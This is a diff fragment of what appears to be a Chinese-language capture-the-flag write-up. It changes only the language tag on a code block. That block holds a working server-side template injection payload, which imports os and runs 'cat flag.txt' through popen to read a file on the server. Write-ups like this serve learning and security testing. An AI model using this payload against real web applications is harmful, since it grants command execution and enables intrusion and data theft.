@@ -221,7 +221,7 @@ pip install arjun
 
 确认存在, 接下来就好办了; 调整一下发现没有严格过滤, 最终 payload:
 
-```
+```python
 /?name={{self.__init__.__globals__.__builtins__['__import__']('os').popen('cat flag.txt').read()}}
 ```
 
